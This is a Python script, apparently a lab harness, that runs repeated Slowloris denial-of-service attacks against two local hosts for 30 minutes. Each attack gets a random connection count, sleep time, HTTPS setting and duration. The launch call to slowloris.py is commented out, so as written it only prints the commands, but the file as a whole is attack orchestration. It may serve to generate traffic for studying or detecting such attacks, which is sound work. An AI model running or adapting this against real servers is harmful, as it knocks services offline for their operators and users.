import os
import time
import multiprocessing
import random

hosts_l = ['tmp.tpr.local','tmp2.tpr.local']
sleeptime_l = [4,9,14]              # secs
sockets_range = (150, 250)          # connections
duration_range = (3, 6)             # mins
attack_interval_range = (30, 90)    # secs

def run_attack(host, sockets, sleeptime, https):
    command = 'python3 slowloris.py {host} -s {sockets} --sleeptime {sleeptime} {https}'
    command = command.format(
        host=host,
        sockets=sockets,
        sleeptime=sleeptime,
        https='--https' if https else '' 
    )
    print(command)
    # os.system(command)


max_duration = 30 * 60  # secs
total_duration = 0      # secs
while total_duration < max_duration:
    start = time.time()

    attack_args = (
        random.choice(hosts_l),                                 # host
        random.randrange(sockets_range[0], sockets_range[1]),   # sockets
        random.choice(sleeptime_l),                             # sleeptime
        random.choice((True, False))                            # use https
    )

    a = multiprocessing.Process(target=run_attack, args=attack_args, name="run attack")
    a.start()

    attack_duration = random.randrange(duration_range[0], duration_range[1])
    attack_duration *= 60
    if total_duration + attack_duration >= max_duration:
        attack_duration = (max_duration - total_duration)
    print('start attack: sleep for {} secs'.format(attack_duration))
    time.sleep(attack_duration)

    print('end attack')
    a.terminate()
    a.join()

    wait_next_attack = random.randrange(attack_interval_range[0], attack_interval_range[1])
    print('sleep for {} secs'.format(wait_next_attack))
    time.sleep(wait_next_attack)

    end = time.time()

    elapsed = end - start
    print('elapsed: {}'.format(elapsed))
    total_duration += elapsed
    print('time progress: {:.2f}/{}'.format(total_duration, max_duration))